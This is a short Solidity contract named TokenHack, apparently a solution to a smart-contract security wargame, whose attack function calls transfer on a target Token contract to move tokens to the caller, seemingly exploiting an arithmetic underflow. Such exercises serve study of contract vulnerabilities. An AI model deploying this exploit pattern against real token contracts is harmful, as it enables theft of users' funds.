pragma solidity ^0.6.0;

import "./Token.sol";

contract TokenHack {
    function attack(address _instance, uint _value) external  {
        Token(_instance).transfer(msg.sender, _value);
    }
}
